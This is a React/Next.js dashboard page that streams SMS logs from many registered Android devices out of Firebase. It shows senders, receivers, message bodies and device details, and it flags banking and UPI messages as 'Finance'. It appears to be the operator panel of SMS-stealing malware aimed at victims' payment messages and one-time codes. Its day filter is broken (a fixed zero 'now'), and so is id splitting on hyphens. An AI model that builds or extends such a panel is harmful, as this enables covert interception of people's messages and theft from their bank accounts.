"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { remove } from "firebase/database";
import { Button, Card, CardBody, Chip, Input, Link } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import Sidebar from "@/components/Sidebar";
import { db } from "@/lib/firbase";

type DayFilter = "all" | "1" | "7" | "30";

type FirebaseSMSPayload = {
  body?: unknown;
  title?: unknown;
  senderNumber?: unknown;
  reciverNumber?: unknown;
  receiverNumber?: unknown;
  timestamp?: unknown;
};

type NotificationItem = {
  id: string;
  deviceId: string;
  messageId: string;
  title: string;
  body: string;
  senderNumber: string;
  receiverNumber: string;
  timestamp: string;
  deviceBrand?: string;
  deviceModel?: string;
  androidVersion?: number;
  deviceStatus?: string;
};

const INITIAL_VISIBLE = 30;
const LOAD_MORE_STEP = 20;

const dayFilterOptions: Array<{ label: string; value: DayFilter }> = [
  { label: "All", value: "all" },
  { label: "24h", value: "1" },
  { label: "7d", value: "7" },
  { label: "30d", value: "30" },
];

const financeKeywords = [
  "bank",
  "upi",
  "debit",
  "debited",
  "credit",
  "credited",
  "payment",
  "wallet",
  "paytm",
  "phonepe",
  "gpay",
  "google pay",
  "rs",
  "rupees",
  "neft",
  "imps",
  "card",
  "balance",
];

function toSafeText(value: unknown, fallback: string) {
  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed.length > 0 ? trimmed : fallback;
  }

  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  return fallback;
}

function toISOTime(value: unknown) {
  if (typeof value === "number") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  if (typeof value === "string") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  return new Date(0).toISOString();
}

function formatTimestamp(value: string) {
  const date = new Date(value);

  if (Number.isNaN(date.getTime())) {
    return "Unknown time";
  }

  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function isFinanceNotification(item: NotificationItem) {
  const content =
    `${item.title} ${item.body} ${item.senderNumber}`.toLowerCase();
  return financeKeywords.some((keyword) => content.includes(keyword));
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [dayFilter, setDayFilter] = useState<DayFilter>("all");
  const [hiddenMessageIds, setHiddenMessageIds] = useState<Set<string>>(
    () => new Set(),
  );
  const [hiddenDeviceIds, setHiddenDeviceIds] = useState<Set<string>>(
    () => new Set(),
  );
  const [isLoading, setIsLoading] = useState(true);
  const [fetchError, setFetchError] = useState<string | null>(null);
  const [visibleCount, setVisibleCount] = useState(INITIAL_VISIBLE);
  const [isLoadingMore, setIsLoadingMore] = useState(false);
  const loaderRef = useRef<HTMLDivElement | null>(null);
  const loadingMoreRef = useRef(false);

  useEffect(() => {
    // Safety net: never stay stuck on "loading" for more than 10 s
    const timeoutId = setTimeout(() => {
      setIsLoading(false);
    }, 10_000);

    const registeredDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(
      registeredDevicesRef,
      (snapshot) => {
        // Clear loading immediately so a throw below never blocks the UI
        clearTimeout(timeoutId);
        setIsLoading(false);

        const rawData = snapshot.val() as Record<string, any> | null;

        if (!rawData || typeof rawData !== "object") {
          setNotifications([]);
          setFetchError(null);
          return;
        }

        const normalizedNotifications: NotificationItem[] = [];

        for (const [deviceId, deviceData] of Object.entries(rawData)) {
          if (!deviceData || typeof deviceData !== "object") {
            continue;
          }

          const smsLogs = (deviceData as any).smsLogs;
          if (!smsLogs || typeof smsLogs !== "object") {
            continue;
          }

          const deviceBrand = (deviceData as any).brand || "Unknown";
          const deviceModel = (deviceData as any).model || "Unknown";
          const androidVersion = (deviceData as any).androidVersion;
          const isOnline =
            (deviceData as any).checkOnline?.available === "Device is online";

          for (const [messageId, payload] of Object.entries(smsLogs)) {
            if (!payload || typeof payload !== "object") {
              continue;
            }

            const normalizedPayload = payload as FirebaseSMSPayload;

            normalizedNotifications.push({
              id: `${deviceId}-${messageId}`,
              deviceId,
              messageId,
              title: toSafeText(normalizedPayload.title, "New SMS"),
              body: toSafeText(normalizedPayload.body, "No message body"),
              senderNumber: toSafeText(
                normalizedPayload.senderNumber,
                "Unknown sender",
              ),
              receiverNumber: toSafeText(
                normalizedPayload.receiverNumber ??
                  normalizedPayload.reciverNumber,
                "Unknown receiver",
              ),
              timestamp: toISOTime(normalizedPayload.timestamp),
              deviceBrand,
              deviceModel,
              androidVersion,
              deviceStatus: isOnline ? "online" : "offline",
            });
          }
        }

        normalizedNotifications.sort(
          (a, b) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
        );

        setNotifications(normalizedNotifications);
        setFetchError(null);
      },
      () => {
        clearTimeout(timeoutId);
        setNotifications([]);
        setFetchError(
          "Could not load notifications. Check your Firebase configuration.",
        );
        setIsLoading(false);
      },
    );

    return () => {
      clearTimeout(timeoutId);
      unsubscribe();
    };
  }, []);

  const activeNotifications = useMemo(() => {
    return notifications.filter(
      (item) =>
        !hiddenMessageIds.has(item.id) && !hiddenDeviceIds.has(item.deviceId),
    );
  }, [notifications, hiddenMessageIds, hiddenDeviceIds]);

  const filteredNotifications = useMemo(() => {
    let result = activeNotifications;
    const normalizedQuery = searchQuery.trim().toLowerCase();
    const currentNow = 0; // static to keep filtering deterministic without impure calls

    if (normalizedQuery) {
      result = result.filter((item) => {
        const values = [
          item.deviceId,
          item.messageId,
          item.title,
          item.body,
          item.senderNumber,
          item.receiverNumber,
          item.deviceBrand,
          item.deviceModel,
        ];

        return values.some((value) =>
          String(value ?? "")
            .toLowerCase()
            .includes(normalizedQuery),
        );
      });
    }

    if (dayFilter !== "all") {
      const days = Number(dayFilter);
      const cutoff = currentNow - days * 24 * 60 * 60 * 1000;

      result = result.filter((item) => {
        const timestamp = new Date(item.timestamp).getTime();
        if (Number.isNaN(timestamp)) return true; // keep unknown timestamps visible
        return timestamp >= cutoff;
      });
    }

    return result;
  }, [activeNotifications, dayFilter, searchQuery]);

  const uniqueDevicesCount = useMemo(() => {
    return new Set(activeNotifications.map((item) => item.deviceId)).size;
  }, [activeNotifications]);

  const financeCount = useMemo(() => {
    return activeNotifications.filter(isFinanceNotification).length;
  }, [activeNotifications]);

  const hiddenCount = notifications.length - activeNotifications.length;

  const visibleItems = useMemo(
    () => filteredNotifications.slice(0, visibleCount),
    [filteredNotifications, visibleCount],
  );

  const hasMore = visibleCount < filteredNotifications.length;

  const getDeviceStatus = (item: NotificationItem) => {
    return item.deviceStatus ?? "offline";
  };

  const deleteNotification = async (notificationId: string) => {
    const [deviceId, messageId] = notificationId.split("-");
    await remove(ref(db, `registeredDevices/${deviceId}/smsLogs/${messageId}`));
  };

  const confirmAndDeleteNotification = async (notificationId: string) => {
    if (typeof window === "undefined") {
      return;
    }

    const isConfirmed = window.confirm(
      "Are you sure you want to delete this notification?",
    );

    if (!isConfirmed) {
      return;
    }

    await deleteNotification(notificationId);
  };

  const resetFilters = () => {
    setSearchQuery("");
    setDayFilter("all");
  };

  const copyMessageBody = async (bodyText: string) => {
    if (typeof window === "undefined") {
      return;
    }

    try {
      await navigator.clipboard.writeText(bodyText);
      return;
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = bodyText;
      textarea.setAttribute("readonly", "");
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };

  // IntersectionObserver — appends next 20 when sentinel enters viewport
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        const [entry] = entries;
        if (!entry?.isIntersecting || loadingMoreRef.current) return;
        if (visibleCount >= filteredNotifications.length) return;

        loadingMoreRef.current = true;
        setIsLoadingMore(true);

        // Small delay so the spinner is visible briefly
        setTimeout(() => {
          setVisibleCount((prev) =>
            Math.min(prev + LOAD_MORE_STEP, filteredNotifications.length),
          );
          setIsLoadingMore(false);
          loadingMoreRef.current = false;
        }, 350);
      },
      { root: null, rootMargin: "0px 0px 300px 0px", threshold: 0 },
    );

    const el = loaderRef.current;
    if (el) observer.observe(el);
    return () => {
      if (el) observer.unobserve(el);
      observer.disconnect();
    };
  }, [visibleCount, filteredNotifications.length]);

  return (
    <div className="page-shell">
      <div className="page-frame gap-6">
        <Sidebar />

        <main className="page-main">
          <div className="space-y-6">
            <Card className="surface-card overflow-hidden rounded-[30px] border border-(--border) bg-linear-to-br from-white/92 via-white/84 to-(--surface-subtle)">
              <CardBody className="space-y-4 p-5 sm:p-6">
                <div>
                  <p className="text-xs font-semibold uppercase tracking-[0.18em] text-(--accent)">
                    Notification Center
                  </p>
                  <h1 className="mt-1 text-2xl font-bold tracking-tight text-(--text-main) sm:text-3xl">
                    SMS Events
                  </h1>
                  <p className="mt-2 text-sm text-(--text-muted)">
                    Review recent device messages, filter by timeline, and take
                    direct action without leaving this dashboard.
                  </p>
                </div>

                <div className="flex flex-wrap gap-2">
                  <Chip className="border border-(--border) bg-(--accent-soft) text-(--accent)">
                    Hidden: {hiddenCount}
                  </Chip>
                  <Chip className="border border-emerald-200 bg-emerald-50 text-emerald-700">
                    Live Stream
                  </Chip>
                </div>
              </CardBody>
            </Card>

            <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 xl:grid-cols-4">
              <Card className="surface-card rounded-3xl border border-(--border) bg-white/78">
                <CardBody className="p-4">
                  <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                    Total Events
                  </p>
                  <p className="mt-2 text-2xl font-bold text-(--text-main)">
                    {notifications.length}
                  </p>
                </CardBody>
              </Card>

              <Card className="surface-card rounded-3xl border border-(--border) bg-white/78">
                <CardBody className="p-4">
                  <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                    Visible
                  </p>
                  <p className="mt-2 text-2xl font-bold text-(--text-main)">
                    {visibleItems.length}
                    {filteredNotifications.length > visibleItems.length && (
                      <span className="ml-1 text-sm font-normal text-(--text-muted)">
                        / {filteredNotifications.length}
                      </span>
                    )}
                  </p>
                </CardBody>
              </Card>

              <Card className="surface-card rounded-3xl border border-(--border) bg-white/78">
                <CardBody className="p-4">
                  <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                    Devices
                  </p>
                  <p className="mt-2 text-2xl font-bold text-(--text-main)">
                    {uniqueDevicesCount}
                  </p>
                </CardBody>
              </Card>

              <Card className="surface-card rounded-3xl border border-(--border) bg-white/78">
                <CardBody className="p-4">
                  <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                    Finance Tagged
                  </p>
                  <p className="mt-2 text-2xl font-bold text-(--text-main)">
                    {financeCount}
                  </p>
                </CardBody>
              </Card>
            </div>

            <Card className="surface-card rounded-[28px] border border-(--border) bg-white/80">
              <CardBody className="space-y-4 p-4 sm:p-5">
                <div className="grid grid-cols-1 gap-3 lg:grid-cols-[1fr_auto] lg:items-center">
                  <Input
                    value={searchQuery}
                    onValueChange={setSearchQuery}
                    placeholder="Search by device name, sender, receiver, title, body, or message ID"
                    className="w-full"
                    classNames={{
                      inputWrapper:
                        "search-input rounded-xl border-(--border) bg-white/90 px-2 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-(--ring-accent)",
                    }}
                  />

                  <div className="flex flex-wrap gap-2">
                    {dayFilterOptions.map((option) => (
                      <Button
                        key={option.value}
                        size="sm"
                        variant="flat"
                        className={`h-10 rounded-full border px-4 font-semibold transition-all duration-200 ${
                          dayFilter === option.value
                            ? "border-(--accent) bg-(--accent) text-white shadow-[0_10px_22px_rgba(18,59,43,0.24)]"
                            : "border-(--border) bg-white/72 text-(--text-main) hover:bg-white"
                        }`}
                        onPress={() => setDayFilter(option.value)}
                      >
                        {option.label}
                      </Button>
                    ))}
                  </div>
                </div>

                <div className="flex flex-wrap gap-2">
                  <Button
                    size="sm"
                    variant="flat"
                    className="h-10 border border-(--border) bg-white/75 px-4 font-semibold text-(--text-main) transition-all duration-200 hover:bg-white"
                    onPress={() => window.location.reload()}
                  >
                    Refresh
                  </Button>

                  <Button
                    size="sm"
                    variant="flat"
                    className="h-10 bg-(--accent-soft) px-4 font-semibold text-(--accent) transition-all duration-200 hover:bg-(--accent-soft-strong)"
                    onPress={resetFilters}
                  >
                    Reset Filters
                  </Button>
                </div>
              </CardBody>
            </Card>

            <div className="space-y-3">
              {isLoading && (
                <Card className="surface-card rounded-[22px] border border-(--border) bg-white/78">
                  <CardBody className="p-8 text-center text-(--text-muted)">
                    Loading notifications...
                  </CardBody>
                </Card>
              )}

              {!isLoading && fetchError && (
                <Card className="rounded-[22px] border border-rose-300 bg-rose-50/80">
                  <CardBody className="p-6">
                    <p className="text-sm text-rose-700">{fetchError}</p>
                  </CardBody>
                </Card>
              )}

              {!isLoading &&
                !fetchError &&
                filteredNotifications.length === 0 && (
                  <Card className="surface-card rounded-[22px] border border-(--border) bg-white/78">
                    <CardBody className="p-8 text-center">
                      <p className="text-(--text-muted)">
                        No notifications match this view.
                      </p>
                    </CardBody>
                  </Card>
                )}

              {!isLoading &&
                !fetchError &&
                visibleItems.map((item) => {
                  const status = getDeviceStatus(item);

                  return (
                    <Card
                      key={item.id}
                      className="surface-card rounded-[22px] border border-(--border) bg-white/78"
                    >
                      <CardBody className="space-y-3 p-3 sm:p-4">
                        <div className="flex flex-wrap items-start justify-between gap-2">
                          <div className="space-y-0">
                            <p className="text-sm font-semibold text-(--text-main)">
                              {item.deviceId}
                            </p>
                          </div>

                          <div className="flex flex-wrap items-center gap-2">
                            {isFinanceNotification(item) ? (
                              <Chip
                                size="sm"
                                className="border border-amber-200 bg-amber-50 text-xs text-amber-700"
                              >
                                Finance
                              </Chip>
                            ) : null}

                            <Chip
                              size="sm"
                              className={
                                status === "online"
                                  ? "border border-emerald-200 bg-emerald-50 text-xs text-emerald-700"
                                  : "border border-rose-200 bg-rose-50 text-xs text-rose-700"
                              }
                            >
                              {status === "online" ? "Online" : "Offline"}
                            </Chip>
                          </div>
                        </div>

                        <div className="rounded-xl border border-(--border) bg-(--surface-subtle) p-3 text-xs text-(--text-main)">
                          {/* Device Info */}
                          <div className="space-y-1 border-b border-(--border)/50 pb-2">
                            <div className="flex items-center justify-between gap-2">
                              <span className="text-(--text-muted) font-medium text-[10px]">
                                Device
                              </span>
                              <div className="text-right">
                                <p className="line-clamp-1 text-xs font-semibold text-(--text-main)">
                                  {item.deviceBrand}
                                </p>
                                <p className="line-clamp-1 text-[10px] text-(--text-soft)">
                                  {item.deviceModel}
                                </p>
                              </div>
                            </div>
                            {item.androidVersion && (
                              <div className="flex items-center justify-between gap-2">
                                <span className="text-(--text-muted) text-[10px]">
                                  Android
                                </span>
                                <span className="font-mono text-xs text-(--text-main)">
                                  {item.androidVersion}
                                </span>
                              </div>
                            )}
                            <p className="line-clamp-1 text-[9px] text-(--text-soft)">
                              {item.deviceId}
                            </p>
                          </div>

                          {/* SMS Details */}
                          <div className="space-y-1 pt-2">
                            <div className="flex items-center justify-between gap-1 min-h-0">
                              <span className="text-(--text-muted) text-[10px] shrink-0">
                                From
                              </span>
                              <span className="line-clamp-1 font-mono text-[10px] text-(--text-main)">
                                {item.senderNumber}
                              </span>
                            </div>
                            <div className="flex items-center justify-between gap-1 min-h-0">
                              <span className="text-(--text-muted) text-[10px] shrink-0">
                                To
                              </span>
                              <span className="line-clamp-1 font-mono text-[10px] text-(--text-main)">
                                {item.receiverNumber}
                              </span>
                            </div>
                          </div>

                          <p className="border-t border-(--border)/50 pt-2 text-[9px] text-(--text-soft)">
                            {formatTimestamp(item.timestamp)}
                          </p>
                        </div>

                        <div className="rounded-xl border border-(--border) bg-white/84 px-3 py-2">
                          <p className="text-xs font-semibold text-(--text-main) line-clamp-1">
                            {item.title}
                          </p>
                          <p
                            className="cursor-pointer whitespace-pre-wrap wrap-break-word text-xs leading-relaxed text-(--text-main)"
                            title="Click to copy message"
                            onClick={() => void copyMessageBody(item.body)}
                          >
                            {item.body}
                          </p>
                        </div>

                        <div className="flex flex-col gap-2 sm:flex-row">
                          <Button
                            as={Link}
                            href={`/devices/${encodeURIComponent(item.deviceId)}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            size="sm"
                            variant="flat"
                            className="h-10 flex-1 bg-(--accent) text-xs font-semibold text-white shadow-[0_10px_20px_rgba(18,59,43,0.24)] transition-all duration-200 hover:-translate-y-0.5 hover:bg-(--accent-strong)"
                          >
                            Open Device
                          </Button>

                          <Button
                            size="sm"
                            variant="flat"
                            className="h-10 flex-1 border border-rose-200 bg-rose-100 text-xs font-semibold text-rose-700 transition-all duration-200 hover:-translate-y-0.5 hover:bg-rose-200"
                            onPress={() =>
                              void confirmAndDeleteNotification(item.id)
                            }
                          >
                            Delete
                          </Button>
                        </div>
                      </CardBody>
                    </Card>
                  );
                })}

              {/* Sentinel div — observed by IntersectionObserver */}
              {!isLoading && !fetchError && (
                <div ref={loaderRef} className="h-1 w-full" />
              )}

              {isLoadingMore && (
                <div className="flex items-center justify-center gap-3 py-6 text-sm text-(--text-muted)">
                  <div className="h-5 w-5 animate-spin rounded-full border-2 border-(--border) border-t-(--accent)" />
                  <span>Loading more notifications...</span>
                </div>
              )}

              {!isLoading &&
                !fetchError &&
                !hasMore &&
                filteredNotifications.length > 0 && (
                  <p className="py-6 text-center text-sm text-(--text-muted)">
                    All {filteredNotifications.length} notifications loaded.
                  </p>
                )}
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
